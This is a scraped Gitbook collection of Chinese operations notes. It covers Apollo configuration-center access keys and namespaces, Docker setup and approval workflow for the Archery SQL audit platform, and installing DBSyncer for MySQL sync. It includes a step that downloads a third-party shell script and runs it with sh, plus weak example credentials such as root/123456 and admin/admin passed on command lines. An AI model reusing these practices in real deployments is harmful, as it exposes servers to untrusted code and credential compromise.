Apollo+ES源码改造，构建民生银行的ELK日志平台配置管理中心 Apollo在有赞的实践 微服务版本切换初始设计思路 Alibaba Sentinel Push模式 规则推送至Apollo配置中心 Apollo 安全相关最佳实践 配置查看权限 从1.1.0版本开始，apollo-portal增加了查看权限的支持，可以支持配置某个环境只允许项目成员查看私有Namespace的配置。 这里的项目成员是指： 项目的管理员 具备该私有Namespace在该环境下的修改或发布权限 配置方式很简单，用超级管理员账号登录后，进入管理员工具 - 系统参数页面新增或修改configView.memberOnly.envs配置项即可。 配置访问密钥 Apollo从1.6.0版本开始增加访问密钥机制，从而只有经过身份验证的客户端才能访问敏感配置。如果应用开启了访问密钥，客户端需要配置密钥，否则无法获取配置。 项目管理员打开管理密钥页面 为项目的每个环境生成访问密钥，注意默认是禁用的，建议在客户端都配置完成后再开启 客户端配置访问密钥 适用于1.6.0及以上版本 Apollo从1.6.0版本开始增加访问密钥机制，从而只有经过身份验证的客户端才能访问敏感配置。如果应用开启了访问密钥，客户端需要配置密钥，否则无法获取配置。 配置方式按照优先级从高到低分别为： 1.通过Java System Property 通过Java System Propertyapollo.access-key.secret(1.9.0+) 或者 apollo.accesskey.secret(1.9.0之前) 可以通过Java的System Property apollo.access-key.secret(1.9.0+) 或者 apollo.accesskey.secret(1.9.0之前)来指定 在Java程序启动脚本中，可以指定-Dapollo.access-key.secret=1cf998c4e2ad4704b45a98a509d15719(1.9.0+) 或者 -Dapollo.accesskey.secret=1cf998c4e2ad4704b45a98a509d15719(1.9.0之前) 如果是运行jar文件，需要注意格式是java -Dapollo.access-key.secret=1cf998c4e2ad4704b45a98a509d15719 -jar xxx.jar(1.9.0+) 或者 java -Dapollo.accesskey.secret=1cf998c4e2ad4704b45a98a509d15719 -jar xxx.jar(1.9.0之前) 也可以通过程序指定，如System.setProperty(\"apollo.access-key.secret\", \"1cf998c4e2ad4704b45a98a509d15719\");(1.9.0+) 或者 System.setProperty(\"apollo.accesskey.secret\", \"1cf998c4e2ad4704b45a98a509d15719\");(1.9.0之前) 2.通过Spring Boot的配置文件 可以在Spring Boot的application.properties或bootstrap.properties中指定apollo.access-key.secret=1cf998c4e2ad4704b45a98a509d15719(1.9.0+) 或者 apollo.accesskey.secret=1cf998c4e2ad4704b45a98a509d15719(1.9.0之前) 3.通过操作系统的System Environment 还可以通过操作系统的System Environment APOLLO_ACCESS_KEY_SECRET(1.9.0+) 或者 APOLLO_ACCESSKEY_SECRET(1.9.0之前)来指定 注意key为全大写 4.通过app.properties配置文件 可以在classpath:/META-INF/app.properties指定apollo.access-key.secret=1cf998c4e2ad4704b45a98a509d15719(1.9.0+) 或者 apollo.accesskey.secret=1cf998c4e2ad4704b45a98a509d15719(1.9.0之前) 自定义server.properties路径 适用于1.8.0及以上版本 1.8.0版本开始支持以下方式自定义server.properties路径，按照优先级从高到低分别为： 一.通过Java System Property apollo.path.server.properties 1.可以通过Java的System Property apollo.path.server.properties来指定 2.在Java程序启动脚本中，可以指定-Dapollo.path.server.properties=/some-dir/some-file.properties 如果是运行jar文件，需要注意格式是java -Dapollo.path.server.properties=/some-dir/some-file.properties -jar xxx.jar 3.也可以通过程序指定，如System.setProperty(\"apollo.path.server.properties\", \"/some-dir/some-file.properties\"); 二、通过操作系统的System EnvironmentAPOLLO_PATH_SERVER_PROPERTIES 可以通过操作系统的System Environment APOLLO_PATH_SERVER_PROPERTIES来指定 注意key为全大写，且中间是_分隔 客户端用法 Apollo支持API方式和Spring整合方式，该怎么选择用哪一种方式？ API方式灵活，功能完备，配置值实时更新（热发布），支持所有Java环境。 Spring方式接入简单，结合Spring有N种酷炫的玩法，如 Placeholder方式： 代码中直接使用，如：@Value(\"${someKeyFromApollo:someDefaultValue}\") 配置文件中使用替换placeholder，如：spring.datasource.url: ${someKeyFromApollo:someDefaultValue} 直接托管spring的配置，如在apollo中直接配置spring.datasource.url=jdbc:mysql://localhost:3306/somedb?characterEncoding=utf8 Spring boot的@ConfigurationProperties方式 从v0.10.0开始的版本支持placeholder在运行时自动更新，具体参见PR #972。（v0.10.0之前的版本在配置变化后不会重新注入，需要重启才会更新，如果需要配置值实时更新，可以参考后续3.2.2 Spring Placeholder的使用的说明） Spring方式也可以结合API方式使用，如注入Apollo的Config对象，就可以照常通过API方式获取配置了： @ApolloConfig private Config config; //inject config for namespace application点击复制错误复制成功 API使用方式 API方式是最简单、高效使用Apollo配置的方式，不依赖Spring框架即可使用。 获取默认namespace的配置（application） Config config = ConfigService.getAppConfig(); //config instance is singleton for each namespace and is never null String someKey = \"someKeyFromDefaultNamespace\"; String someDefaultValue = \"someDefaultValueForTheKey\"; String value = config.getProperty(someKey, someDefaultValue); 通过上述的config.getProperty可以获取到someKey对应的实时最新的配置值。 另外，配置值从内存中获取，所以不需要应用自己做缓存。 Go、Python、Nodejs、PHP等客户端使用 对应开发语言支持：https://www.apolloconfig.com/#/zh/usage/third-party-sdks-user-guide Apollo PHP 客户端 1 项目地址：apollo-php-client Apollo PHP 客户端 2 项目地址：apollo-sdk-config 项目地址：apollo-sdk-clientd 什么是Namespace Namespace是配置项的集合，类似于一个配置文件的概念。 个人觉得也是Apollo的比较重要和核心的知识点！ 什么是“application”的Namespace Apollo在创建项目的时候，都会默认创建一个“application”的Namespace。顾名思义，“application”是给应用自身使用的，熟悉Spring Boot的同学都知道，Spring Boot项目都有一个默认配置文件application.yml。在这里application.yml就等同于“application”的Namespace。对于90%的应用来说，“application”的Namespace已经满足日常配置使用场景了。 客户端获取“application” Namespace的代码如下： Config config = ConfigService.getAppConfig(); 客户端获取非“application” Namespace的代码如下： Config config = ConfigService.getConfig(namespaceName); Namespace的格式有哪些？ 配置文件有多种格式，例如：properties、xml、yml、yaml、json等。同样Namespace也具有这些格式。在Portal UI中可以看到“application”的Namespace上有一个“properties”标签，表明“application”是properties格式的。 注1：非properties格式的namespace，在客户端使用时需要调用ConfigService.getConfigFile(String namespace, ConfigFileFormat configFileFormat)来获取，如果使用Http接口直接调用时，对应的namespace参数需要传入namespace的名字加上后缀名，如datasources.json。 注2：apollo-client 1.3.0版本开始对yaml/yml做了更好的支持，使用起来和properties格式一致：Config config = ConfigService.getConfig(\"application.yml\");，Spring的注入方式也和properties一致。 Namespace的获取权限分类 private （私有的） public （公共的） 这里的获取权限是相对于Apollo客户端来说的。 private权限的Namespace：只能被所属的应用获取到。一个应用尝试获取其它应用private的Namespace，Apollo会报“404”异常。 public权限的Namespace： 能被任何应用获取。 Namespace的类型 Namespace类型有三种： 私有类型 具有private权限。例如上文提到的“application” Namespace就是私有类型。 公共类型 具有public权限。公共类型的Namespace相当于游离于应用之外的配置，且通过Namespace的名称去标识公共Namespace，所以公共的Namespace的名称必须全局唯一。 使用场景：部门级别共享的配置、小组级别共享的配置、几个项目之间共享的配置、中间件客户端的配置。 关联类型（继承类型） 关联类型又可称为继承类型，关联类型具有private权限。关联类型的Namespace继承于公共类型的Namespace，用于覆盖公共Namespace的某些配置。 例如公共的Namespace有两个配置项 k1 = v1 k2 = v2 然后应用A有一个关联类型的Namespace关联了此公共Namespace，且覆盖了配置项k1，新值为v3。那么在应用A实际运行时，获取到的公共Namespace的配置为： k1 = v3 k2 = v2 关联类型使用场景： 举一个实际使用的场景。假设RPC框架的配置（如：timeout）有以下要求： 提供一份全公司默认的配置且可动态调整 RPC客户端项目可以自定义某些配置项且可动态调整 如果把以上两点要求去掉“动态调整”，那么做法很简单。在rpc-client.jar包里有一份配置文件，每次修改配置文件然后重新发一个版本的jar包即可。同理，客户端项目修改配置也是如此。 如果只支持客户端项目可动态调整配置。客户端项目可以在Apollo “application” Namespace上配置一些配置项。在初始化service的时候，从Apollo上读取配置即可。这样做的坏处就是，每个项目都要自定义一些key，不统一。 那么如何完美支持以上需求呢？答案就是结合使用Apollo的公共类型的Namespace和关联类型的Namespace。RPC团队在Apollo上维护一个叫“rpc-client”的公共Namespace，在“rpc-client” Namespace上配置默认的参数值。rpc-client.jar里的代码读取“rpc-client”Namespace的配置即可。如果需要调整默认的配置，只需要修改公共类型“rpc-client” Namespace的配置。如果客户端项目想要自定义或动态修改某些配置项，只需要在Apollo 自己项目下关联“rpc-client”，就能创建关联类型“rpc-client”的Namespace。然后在关联类型“rpc-client”的Namespace下修改配置项即可。这里有一点需要指出的，那就是rpc-client.jar是在应用容器里运行的，所以rpc-client获取到的“rpc-client” Namespace的配置是应用的关联类型的Namespace加上公共类型的Namespace。 例子 如下图所示，有三个应用：应用A、应用B、应用C。 应用A有两个私有类型的Namespace：application和NS-Private，以及一个关联类型的Namespace：NS-Public。 应用B有一个私有类型的Namespace：application，以及一个公共类型的Namespace：NS-Public。 应用C只有一个私有类型的Namespace：application 应用A获取Apollo配置 //application Config appConfig = ConfigService.getAppConfig(); appConfig.getProperty(\"k1\", null); // k1 = v11 appConfig.getProperty(\"k2\", null); // k2 = v21 //NS-Private Config privateConfig = ConfigService.getConfig(\"NS-Private\"); privateConfig.getProperty(\"k1\", null); // k1 = v3 privateConfig.getProperty(\"k3\", null); // k3 = v4 //NS-Public，覆盖公共类型配置的情况，k4被覆盖 Config publicConfig = ConfigService.getConfig(\"NS-Public\"); publicConfig.getProperty(\"k4\", null); // k4 = v6 cover publicConfig.getProperty(\"k6\", null); // k6 = v6 publicConfig.getProperty(\"k7\", null); // k7 = v7点击复制错误复制成功 应用B获取Apollo配置 //application Config appConfig = ConfigService.getAppConfig(); appConfig.getProperty(\"k1\", null); // k1 = v12 appConfig.getProperty(\"k2\", null); // k2 = null appConfig.getProperty(\"k3\", null); // k3 = v32 //NS-Private，由于没有NS-Private Namespace 所以获取到default value Config privateConfig = ConfigService.getConfig(\"NS-Private\"); privateConfig.getProperty(\"k1\", \"default value\"); //NS-Public Config publicConfig = ConfigService.getConfig(\"NS-Public\"); publicConfig.getProperty(\"k4\", null); // k4 = v5 publicConfig.getProperty(\"k6\", null); // k6 = v6 publicConfig.getProperty(\"k7\", null); // k7 = v7点击复制错误复制成功 应用C获取Apollo配置 //application Config appConfig = ConfigService.getAppConfig(); appConfig.getProperty(\"k1\", null); // k1 = v12 appConfig.getProperty(\"k2\", null); // k2 = null appConfig.getProperty(\"k3\", null); // k3 = v33 //NS-Private，由于没有NS-Private Namespace 所以获取到default value Config privateConfig = ConfigService.getConfig(\"NS-Private\"); privateConfig.getProperty(\"k1\", \"default value\"); //NS-Public，公共类型的Namespace，任何项目都可以获取到 Config publicConfig = ConfigService.getConfig(\"NS-Public\"); publicConfig.getProperty(\"k4\", null); // k4 = v5 publicConfig.getProperty(\"k6\", null); // k6 = v6 publicConfig.getProperty(\"k7\", null); // k7 = v7点击复制错误复制成功 ChangeListener 以上代码例子中可以看到，在客户端Namespace映射成一个Config对象。Namespace配置变更的监听器是注册在Config对象上。 所以在应用A中监听application的Namespace代码如下： Config appConfig = ConfigService.getAppConfig(); appConfig.addChangeListener(new ConfigChangeListener() { public void onChange(ConfigChangeEvent changeEvent) { //do something } }) 在应用A中监听NS-Private的Namespace代码如下： Config privateConfig = ConfigService.getConfig(\"NS-Private\"); privateConfig.addChangeListener(new ConfigChangeListener() { public void onChange(ConfigChangeEvent changeEvent) { //do something } }) 在应用A、应用B、应用C中监听NS-Public的Namespace代码如下： Config publicConfig = ConfigService.getConfig(\"NS-Public\"); publicConfig.addChangeListener(new ConfigChangeListener() { public void onChange(ConfigChangeEvent changeEvent) { //do something } }) 调整ApolloConfigDB配置 配置项统一存储在ApolloConfigDB.ServerConfig表中，需要注意每个环境的ApolloConfigDB.ServerConfig都需要单独配置，修改完一分钟实时生效。 namespace.lock.switch - 一次发布只能有一个人修改开关，用于发布审核 这是一个功能开关，如果配置为true的话，那么一次配置发布只能是一个人修改，另一个发布。 生产环境建议开启此选项 服务端配置说明 以下配置除了支持在数据库中配置以外，也支持通过-D参数、application.properties等配置，且-D参数、application.properties等优先级高于数据库中的配置 调整ApolloPortalDB配置 配置项统一存储在ApolloPortalDB.ServerConfig表中，也可以通过管理员工具 - 系统参数页面进行配置，无特殊说明则修改完一分钟实时生效。 apollo.portal.envs - 可支持的环境列表 默认值是dev，如果portal需要管理多个环境的话，以逗号分隔即可（大小写不敏感），如： DEV,FAT,UAT,PRO 名词解释： DEV(Development environment) 开发环境，用于开发者调试使用 FAT(Feature Acceptance Test environment) 功能验收测试环境，用于软件测试者测试使用 UAT(User Acceptance Test environment) 用户验收测试环境，用于用户测试验收使用 PRO(Production environment) 生产环境 修改完需要重启生效。 注1：一套Portal可以管理多个环境，但是每个环境都需要独立部署一套Config Service、Admin Service和ApolloConfigDB，具体请参考：2.1.2 创建ApolloConfigDB，3.2 调整ApolloConfigDB配置，2.2.1.1.2 配置数据库连接信息，另外如果是为已经运行了一段时间的Apollo配置中心增加环境，别忘了参考2.1.2.4 从别的环境导入ApolloConfigDB的项目数据对新的环境做初始化。 注2：只在数据库添加环境是不起作用的，还需要为apollo-portal添加新增环境对应的meta server地址，具体参考：2.2.1.1.2.4 配置apollo-portal的meta service信息。apollo-client在新的环境下使用时也需要做好相应的配置，具体参考：1.2.2 Apollo Meta Server。 注3：如果希望添加自定义的环境名称，具体步骤可以参考Portal如何增加环境。 注4：1.1.0版本增加了系统信息页面（管理员工具 -> 系统信息），可以通过该页面检查配置是否正确 多环境部署 配置apollo-portal的meta service信息 Apollo Portal需要在不同的环境访问不同的meta service(apollo-configservice)地址，所以我们需要在配置中提供这些信息。默认情况下，meta service和config service是部署在同一个JVM进程，所以meta service的地址就是config service的地址。 对于1.6.0及以上版本，可以通过ApolloPortalDB.ServerConfig中的配置项来配置Meta Service地址，详见apollo.portal.meta.servers - 各环境Meta Service列表 使用程序员专用编辑器（如vim，notepad++，sublime等）打开apollo-portal-x.x.x-github.zip中config目录下的apollo-env.properties文件。 假设DEV的apollo-configservice未绑定域名，地址是192.168.1.5:8080，PRO的apollo-configservice绑定了域名apollo.chuanqu.ltd，那么可以如下修改各环境meta service服务地址，格式为${env}.meta=http://${config-service-url:port}，如果某个环境不需要，也可以直接删除对应的配置项（如lpt.meta）： dev.meta=http://1.1.1.1:8080 fat.meta=http://apollo.fat.xxx.com uat.meta=http://apollo.uat.xxx.com pro.meta=http://apollo.xxx.com 除了通过apollo-env.properties方式配置meta service以外，apollo也支持在运行时指定meta service（优先级比apollo-env.properties高）： 通过Java System Property ${env}_meta 可以通过Java的System Property ${env}_meta来指定 如java -Ddev_meta=http://config-service-url -jar xxx.jar 也可以通过程序指定，如System.setProperty(\"dev_meta\", \"http://config-service-url\"); 通过操作系统的System Environment ${ENV}_META 如DEV_META=http://config-service-url 注意key为全大写，且中间是_分隔 注1: 为了实现meta service的高可用，推荐通过SLB（Software Load Balancer）做动态负载均衡 注2: meta service地址也可以填入IP，0.11.0版本之前只支持填入一个IP。从0.11.0版本开始支持填入以逗号分隔的多个地址（PR #1214），如http://1.1.1.1:8080,http://2.2.2.2:8080，不过生产环境还是建议使用域名（走slb），因为机器扩容、缩容等都可能导致IP列表的变化。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 11:07:26 "},"doc/Open-databases/":{"url":"doc/Open-databases/","title":"开源软件-数据库","keywords":"","body":"开源软件-数据库相关 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-29 14:01:28 "},"doc/Open-databases/1_Archery_Install_Docker.html":{"url":"doc/Open-databases/1_Archery_Install_Docker.html","title":"Archery-基于docker安装","keywords":"","body":"开源SQL审核查询平台Archery-基于docker安装 一、Archery产品介绍 在技术团队内部进行有效的 SQL 管理并不容易，如何进行数据库的统一管理，和线上 SQL 操作的统一审核，变得尤为重要。Archery，这个开源的 SQL 审核查询平台，或许能为 SQL 审核工作带来不小的效率提升。 一条高质量的 SQL 语句能使整个服务加速好几倍，而一条有问题的 SQL 则可能会引发灾难，造成严重后果，因此，数据库管理人员的工作就十分重要了，他们掌握着千百万数据的命运。 简介 Archery，是 hhyo 在 Github 上开源的 SQL 审核查询平台，项目位于 https://github.com/hhyo/Archery，同时也在 Gitee 上开源，位于 https://gitee.com/rtttte/Archery 二、基于docker搭建Archery 1.服务器环境介绍 服务器：centos7 IP: 192.168.1.12 4C-8G-4T 本文主要参考：https://archerydms.com/installation/docker/ 2.安装docker 如果安装了可以跳过 wget https://gitee.com/funet8/centos6_LANP_dockerfile/raw/master/shell/CentOS6_7_intall_docker.sh sh CentOS6_7_intall_docker.sh 3.安装docker-compose 如果安装了可以跳过 sudo curl -L \"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose /usr/local/bin/docker-compose -v docker-compose version 1.24.1, build 4667896b docker部署 https://archerydms.com/installation/docker/ 下载了 Archery-1.7.13 解压. 下载并且解压 wget https://github.com/hhyo/Archery/archive/v1.7.13.tar.gz tar -zxvf v1.7.13.tar.gz cd Archery-1.7.13/src/docker-compose/ ls archery docker-compose.yml inception mysql 4.安装并且docker启动 如果有端口占用，需要修改 docker-compose.yml 里的文件端口，但是需要修改配置，宿主机最好不要占用这些端口 # 启动 docker-compose -f docker-compose.yml up -d 生成了五个docker实例：redis inception archery goinception mysql # 表结构初始化 docker exec -ti archery /bin/bash cd /opt/archery source /opt/venv4archery/bin/activate python3 manage.py makemigrations sql python3 manage.py migrate # 数据初始化 python3 manage.py dbshellredis 端口：6379 mysql端口：3306 inception端口：6669 goinception端口：4000 archery端口：9123 # docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES e961c33a0726 redis:5 \"docker-entrypoint...\" 4 minutes ago Up 3 minutes 6379/tcp redis dec2f8e330b7 hhyo/archery:1.7.13 \"dockerize -wait t...\" 4 minutes ago Up 3 minutes 0.0.0.0:9123->9123/tcp archery ccaca4c8d420 mysql:5.7 \"docker-entrypoint...\" 4 minutes ago Up 3 minutes 0.0.0.0:3306->3306/tcp, 33060/tcp mysql 5a7fc2e52484 hanchuanchuan/goinception \"/usr/local/bin/du...\" 4 minutes ago Up 3 minutes 4000/tcp goinception 16ef27ac1cee hhyo/inception \"/bin/sh -c 'nohup...\" 4 minutes ago Up 3 minutes 6669/tcp inception 三、基本操作 关闭docker服务 docker stop redis docker stop inception docker stop archery docker stop goinception docker stop mysql 删除docker容器（谨慎操作） 删除之后数据没有了 docker rm -f redis docker rm -f inception docker rm -f archery docker rm -f goinception docker rm -f mysql 访问 访问，http://192.168.1.12:9123/ 下一篇文章讲解如何配置Archery后台配置基本操作 四、角色权限 default DBA 数据库管理员（Database Administrator，简称DBA） RD 研发（Research and Development） PM 项目经理( Project Manager ) QA 测试（QUALITY ASSURANCE，中文意思是“质量保证”） 工作流： RD-->DBA-->CTO（审批） 工作流 功能说明 项目提供简单的多级审批流配置，审批流程和资源组以及审批类型相关，不同资源组和审批类型可以配置不同的审批流程，审批流程配置的是权限组，可避免审批人单点的问题 相关配置 在系统管理-配置项管理页面，可进行组工单审批流程的配置 对于SQL上线和SQL查询权限工单，如果用户拥有('sql_review', '审核SQL上线工单')、('sql_execute_for_resource_group', '执行SQL上线工单')、('query_review', '审核查询权限')权限，就可以查看到当前用户所在资源组的所有工单 工单待审核时，关联当前审批权限组、并且关联工单所在资源组的用户，均可查看审核工单（资源组隔离） 待办列表包含当前用户可审核的所有工单 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Open-databases/2_Archery_config.html":{"url":"doc/Open-databases/2_Archery_config.html","title":"Archery-后台配置基本操作","keywords":"","body":"SQL审核查询平台Archery-后台配置基本操作 一.系统配置 1.Inception配置 GO_INCEPTION_HOST:goInception的连接地址,用于MySQL审核执行，docker-compose启动的请配置为容器名,比如goinception，参考文档：https://github.com/hanchuanchuan/goInception goInception的连接端口，默认 4000 INCEPTION_HOST Inception连接HOST，用于SQL查询语法解析，docker-compose启动的请配置为容器名，比如 inception，参考文档 ：https://github.com/hhyo/inception INCEPTION_PORT Inception连接端口，即Inception配置文件inc.cnf内的port 如图 具体配置可参考官方的文档：https://archerydms.com/configuration/ 2.邮件配置 点击测试： 二.新建资源组 登录后台 系统资源--->资源组管理--->添加组 建议将开发数据库、测试数据库、正式数据库划分到一个组里，后期方便管理。 添加实例 如图： 实例管理--->实例列表--->添加实例 如图填写实例信息 配置审批流程 配置项管理--->选择操作，下拉选择“工单审核流配置”--->变更审批流程（选择变更审批流顺序） 这样在提交的工作流 先由RD开发提交SQL上线工作流--->DBA审核--->PM最后审核上线 完成一个完整的SQL审批工作流。 三、用户管理 如图，系统管理--->其他配置管理--->用户管理 增加用户 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Open-databases/3_Archery_online.html":{"url":"doc/Open-databases/3_Archery_online.html","title":"Archery-SQL上线流程","keywords":"","body":"开源SQL审核查询平台Archery-SQL上线流程 SQL上线流程 在后台设置审批流为 DBA->PM RD（研发提交SQL语句审核）--->DBA(审核SQL语句)---->PM（项目经理）上线 1.RD角色提交SQL 使用RD用户登录后台，SQL审核--->SQL上线--->提交SQL 提交SQL语句 2.DBA角色审核语句 审核通过或者终止流程 3.PM角色审核上线 立即执行或者手动执行。 SQL查询 系统自动驳回-解决方案 使用admin账号： “系统管理”--->“配置项管理”---->“系统设置” CRITICAL_DDL_REGEX 高危SQL语句正则判断条件，用于控制禁止提交的语句，匹配的语句会禁止提交，例如^truncate|^rename|^delete则会禁止提交清空表、修改表名、删除操作的SQL语句，前端展现如下 AUTO_REVIEW_WRONG 用于控制自动驳回的等级，驳回的工单不会通知审核人，会系统直接审核不通过。 1表示SQL上线审核出现警告信息就驳回， 2和空表示出现错误才驳回，其他设置表示不驳回， 审核规则请参考Inception所支持的参数变量（https://inception-document.readthedocs.io/zh_CN/latest/variables/），前端展现如下 在后台设置中，将“AUTO_REVIEW_WRONG的值改为0”保存 SQL语句审核不通过也不会被驳回。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Open-databases/4.sql-bieming.html":{"url":"doc/Open-databases/4.sql-bieming.html","title":"Archery-SQL上线提示库名过长，建议使用别名解析","keywords":"","body":"SQL上线提示库名过长，建议使用别名解析 SQL上线，报错阿里云RDS，备份库名 'rm-wz99XXXXXXXXX.mysql.rds.aliyuncs.com-3306-XXXXXX' 过长，建议使用别名解析。 报错如图 https://github.com/hhyo/Archery/issues/309 改变思路将RDS的域名连接改为IP连接。ping域名得到地址。 提交工单询问阿里云客服 问题描述 ： RDS如何使用IP地址连接？ 获取IP地址，由于业务的需要不能使用域名连接rds，需要使用ip地址。 ping RDS的外网地址 # ping rm-aaaaaaa.mysql.rds.aliyuncs.com 64 bytes from 47.112.69.163 (1.2.3.4): icmp_seq=1 ttl=92 time=7.86 ms 实际操作： mysql -uuser -h 1.2.3.4 -P3306 -p\"密码\" 可以连接。 问题 1.RDS如何使用IP地址连接？ 2.使用RDS的外网地址ping获取IP地址：1.2.3.4， 这个地址是固定的还是会变动？如果变化的规则是如何的？ 3.如果有只读实例如何使用IP连接？ 阿里云客服回答 您好，您这边如果使用地址连接的话，就是您反馈的1.2.3.4 不过这个IP是不固定的，具体变化是根据您实例状态，如果实例有变配升级或者迁移可用区，包括ha切换这个ip都会变动。 只读实例也有连接地址，您同样的方法ping一下就可以看到ip 如果您实例不变配或者升级之类的操作，包括不出现故障切换备节点的情况目前不会变化 考虑如果阿里云rds域名数据库改为IP连接，要考虑如果发生变化后台则要修改相关的配置。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Open-databases/开源的数据同步中间件-DBSyncer.html":{"url":"doc/Open-databases/开源的数据同步中间件-DBSyncer.html","title":"开源的数据同步中间件-DBSyncer","keywords":"","body":"开源的数据同步中间件-DBSyncer 项目介绍 DBSyncer是一款开源的数据同步中间件，提供Mysql、Oracle、SqlServer、Elasticsearch(ES)、Kafka、SQL(Mysql/Oracle/SqlServer)等同步场景。支持上传插件自定义同步转换业务，提供监控全量和增量数据统计图、应用性能预警等。 开源地址：https://gitee.com/ghi/dbsyncer 组合驱动，自定义库同步到库组合，关系型数据库与非关系型之间组合，任意搭配表同步映射关系 实时监控，驱动全量或增量实时同步运行状态、结果、同步日志和系统日志 开发插件，自定义转化同步逻辑 安装部署 系统介绍 centos7 ip:192.168.1.8 需要部署安装JDK和Maven 安装JDK 1.8 如果安装了可以忽略 # mkdir /data/software/ # cd /data/software/ # wget http://js.funet8.com/centos_software/jdk-8u211-linux-x64.tar.gz # mkdir /usr/local/java/ # tar -zxvf jdk-8u211-linux-x64.tar.gz -C /usr/local/java/ # echo ' export JAVA_HOME=/usr/local/java/jdk1.8.0_211 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH '>> /etc/profile # source /etc/profile # ln -s /usr/local/java/jdk1.8.0_211/bin/java /usr/bin/java # java -version 安装maven # mkdir /data/maven # cd /data/maven # wget http://mirrors.cnnic.cn/apache/maven/maven-3/3.5.4/binaries/apache-maven-3.5.4-bin.tar.gz 备用下载地址： # wget http://js.funet8.com/centos_software/apache-maven-3.5.4-bin.tar.gz # tar -zxvf apache-maven-3.5.4-bin.tar.gz 配置maven： # vim /etc/profile 在配置文件配置中加上： export MAVEN_HOME=/data/maven/apache-maven-3.5.4 export PATH=$MAVEN_HOME/bin:$PATH 使配置立即生效 # source /etc/profile # mvn --version Apache Maven 3.5.4 下载安装包 https://gitee.com/ghi/dbsyncer/releases ，这里我下载v1.1.7-Beta版本 # cd /data/wwwroot/web/ # wget http://js.funet8.com/centos_software/dbsyncer-v1.1.7-Beta.tar.gz 解压 # tar -zxvf dbsyncer-v1.1.7-Beta.tar.gz # cd dbsyncer-v1.1.7-Beta 编译包 # sh build.sh ... [INFO] BUILD SUCCESS [INFO] ------------------------------------------------------------------------ [INFO] Total time: 03:17 min [INFO] Finished at: 2022-04-28T16:40:21+08:00 [INFO] ------------------------------------------------------------------------ ‘/data/wwwroot/web/dbsyncer-v1.1.7-Beta/dbsyncer-web/target/dbsyncer-1.1.7-Beta.zip’ -> ‘/data/wwwroot/web/dbsyncer-v1.1.7-Beta/dbsyncer-1.1.7-Beta.zip’ # unzip dbsyncer-1.1.7-Beta.zip # cd dbsyncer-1.1.7-Beta # ./bin/startup.sh 查看端口 # netstat -tunpl|grep 18686 tcp6 0 0 :::18686 :::* LISTEN 5754/java 开放端口(非必要) iptables -A INPUT -p tcp --dport 18686 -j ACCEPT service iptables save systemctl restart iptables.service 打开浏览器访问 http://IP:18686 http://192.168.1.8:18686/ 账号和密码 admin/admin 同步MySQL数据库 192.168.1.6:3306 同步到---> 192.168.1.8:61921 192.168.1.6:61922 root 123456 192.168.1.8:61921 root 123456 同步数据库 dzzoffice mysql -u root -h 192.168.1.6 -P61922 -p'123456' mysql -u root -h 192.168.1.8 -P61921 -p'123456' 查看binlog日志 > show binary logs; 目标库的server_id不能为1 mysqladmin -u root -h 192.168.1.8 -p123456 -P61921 shutdown 修改mysql的配置文件 server_id=1 改为 server_id=100 再次启动 /usr/bin/mysqld_safe --defaults-file=/data/mysql/etc/61921.cnf & 添加连接 进入后台点击 “添加连接” 添加驱动 启动 优点： 开源系统，使用上类似于阿里云的DTS，如果作为数据同步使用还可以，作为生产环境就需要多测试了 主要用于A库的某数据库同步到B库 增量同步配置（源库） Mysql Dump Binlog二进制日志。Master同步Slave, 创建IO线程读取数据，写入relaylog，基于消息订阅捕获增量数据。 配置 修改my.ini文件 #服务唯一ID server_id=1 log-bin=mysql_bin binlog-format=ROW max_binlog_cache_size = 256M max_binlog_size = 512M expire_logs_days = 7 #监听同步的库, 多个库使用英文逗号“,”拼接 replicate-do-db=test Oracle CDN注册订阅。监听增删改事件，得到rowid，根据rowid执行SQL查询，得到变化数据。 授予账号监听权限, 同时要求目标源表必须定义一个长度为18的varchar字段，通过接收rowid值实现增删改操作。 grant change notification to 你的账号 定时 假设源表数据格式 预览 驱动管理 驱动详情 驱动表字段关系配置 监控 上传插件 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-29 16:51:39 "},"doc/cloud-disk/":{"url":"doc/cloud-disk/","title":"网盘系统","keywords":"","body":"网络硬盘 开源系统 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/cloud-disk/OwnCloud.html":{"url":"doc/cloud-disk/OwnCloud.html","title":"OwnCloud搭建自己的私有云盘","keywords":"","body":"OwnCloud搭建自己的私有云盘 OwnCloud 是什么 ownCloud 跨平台支持 Windows、Mac、Android、iOS、Linux 等平台，而且还提供了网页版和 WebDAV 形式访问，因此你可以在任何电脑、手机上都能轻松获取你的文件了，是一个开源免费专业的私有云存储项目，它能帮你快速在个人电脑或服务器上架设一套专属的私有云文件同步网盘，可以像 Dropbox 那样实现文件跨平台同步、共享、版本控制、团队协作等等。 ownCloud 能让你将所有的文件掌握在自己的手中，只要你的设备性能和空间充足，那么用起来几乎没有任何限制。 官网：https://owncloud.com/ ownCloud 不仅适用于个人使用，对经常需要传输共享文件、远程协作等需求的团队或公司更是合适！功能上也很强大：能支持文件分享、获取文件链接、文件版本历史控制 (文件删除恢复)、文件评论协作、文件共享(可设置读写权限)、图片音乐和文档等文件预览、开放 API、支持第三方应用整合等等。除了云存储之外，ownCloud 还可以用于同步日历、电子邮件联系人、网页浏览器的书签等功能。 ownCloud 项目使用了 PHP+MySQL 的经典组合，无论在自己的电脑上或是 VPS 服务器上，基本上只要能跑 WordPress 网站的机器都能运行了，安装服务器端就像用 PHP 程序建站一样简单。官方建议在 Linux (如 Ubuntu 或 CentOS) 系统下搭建，对于 Windows 作为主机的用户，可以通过 